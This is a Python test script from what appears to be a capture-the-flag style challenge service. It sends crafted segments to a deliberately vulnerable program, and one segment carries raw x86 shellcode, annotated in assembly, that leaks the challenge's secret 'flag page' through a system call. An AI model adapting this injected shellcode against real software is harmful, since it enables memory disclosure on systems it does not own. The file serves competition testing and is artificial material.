#!/usr/bin/env python
#
# Copyright (C) 2014 
#   Brian Caswell <bmc@lungetech.com>
#   Narf Industries <info@narfindustries.com>
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
import string
import sys
import os

from generator.actions import Actions
from random import choice,randint
from struct import *


sys.path.append(os.path.dirname(os.path.realpath(__file__)))

from payloads import *

def random_alpha(a, b):
    return ''.join(choice(string.letters) for _ in range(randint(a, b)))

def build_seg(l,n,d,c):
    return pack("<I16s112s4096s",l,n,d,c)

responses = [
    "It's all just electrons.",
    "TOO MANY SECRETS",
    "It's a living.",
    "Mess with the best...",
    "You can't stop the signal, Mal.",
]

class SIGSEGV(Actions):
    def start(self):
        pass
    def multi(self):
        leak = "\xb8\x02\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x00\xc0GC\xba\x04\x00\x00\x00\xbe\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80"
        '''
        Payload to leak flag page, then exit:
            movl   $0x2, %eax
            movl   $0x1, %ebx
            movl   $0x4347C000,%ecx
            movl   $0x4, %edx
            movl   $0x0, %esi
            int    $0x80
            movl   $0x1, %eax
            int    $0x80
        '''

        sel = randint(0,len(responses)-1)
        name = random_alpha(1,15)
        desc = random_alpha(1,111)

        self.write(pack("<I",3))
        self.write(build_seg(4096,name,desc,payloads[sel]))
        self.write(build_seg(4096,name,desc,payloads[sel]))
        self.write(build_seg(4096,name,desc,pack("4096s",leak)))
        self.read(delim="\n",expect=name)
        self.read(delim="\n",expect=desc)
        self.read(delim="\n",expect=responses[sel])
        self.read(delim="\n",expect=name)
        self.read(delim="\n",expect=desc)
        self.read(delim="\n",expect=responses[sel])
        self.read(delim="\n",expect=name)
        self.read(delim="\n",expect=desc)
        #this won't happen, in either the patched or unpatched ver
        self.read(delim="\n",expect=responses[sel])
        self.read(delim="\n",expect="fin.")



